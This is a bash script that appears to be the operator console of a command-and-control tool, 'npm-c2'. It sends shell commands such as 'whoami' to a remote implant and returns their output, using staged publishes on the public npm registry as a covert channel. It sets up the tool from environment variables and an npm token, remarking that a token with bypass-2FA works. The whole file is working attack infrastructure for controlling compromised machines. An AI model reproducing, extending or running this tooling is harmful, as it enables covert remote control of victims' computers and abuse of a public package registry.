#!/usr/bin/env bash
# npm-c2 operator console, over the npm staging transport.
#
#   ./c2.sh                  interactive console (listening)
#   ./c2.sh "whoami"         one command and its output
#   ./c2.sh -c beef "dir"    override the channel (must match the implant)
#
# Configuration is environment only, so nothing secret lives in the repo:
#
#   C2_PKG            package that carries the channel        (required)
#   C2_CHAN           4-char channel id, first char a-f       (default c0ff)
#   C2_PASS           channel passphrase, must match the      (optional)
#                     implant's --passphrase
#   C2_TOKEN          npm token; falls back to .c2token
#   NPMC2_API_BASE    registry base URL     (default https://registry.npmjs.org)
#
# The token needs permission to read the staging list and to stage a publish.
# A granular token with bypass-2FA works; classic tokens do not exist anymore.
set -euo pipefail

cd "$(dirname "$0")"

PKG="${C2_PKG:-}"
CHAN="${C2_CHAN:-c0ff}"
PASS="${C2_PASS:-}"
BASE="${NPMC2_API_BASE:-https://registry.npmjs.org}"

if [[ -z "$PKG" ]]; then
  echo "[-] set C2_PKG to the package that carries the channel" >&2
  exit 1
fi

if [[ -n "${C2_TOKEN:-}" ]]; then
  TOKEN="$C2_TOKEN"
elif [[ -f .c2token ]]; then
  TOKEN="$(< .c2token)"
else
  echo "[-] no token: export C2_TOKEN or create .c2token (chmod 600)" >&2
  exit 1
fi

# Local environment: create it once, then reuse it.
if [[ ! -x .venv/bin/python ]]; then
  echo "[+] creating .venv"
  python3 -m venv .venv
  .venv/bin/python -m pip install -q --upgrade pip
  .venv/bin/python -m pip install -q -e .
fi
if ! .venv/bin/python -c 'import npm_c2' >/dev/null 2>&1; then
  .venv/bin/python -m pip install -q -e .
fi

# -c <channel> before the command, everything else goes to the CLI.
if [[ "${1:-}" == "-c" ]]; then
  CHAN="${2:?missing channel after -c}"
  shift 2
fi

ARGS=(stage -p "$PKG" -t "$TOKEN" -c "$CHAN" --base "$BASE" --timeout 120 --interval 4)
if [[ -n "$PASS" ]]; then
  ARGS+=(--passphrase "$PASS")
fi

exec .venv/bin/python -m npm_c2 "${ARGS[@]}" "$@"
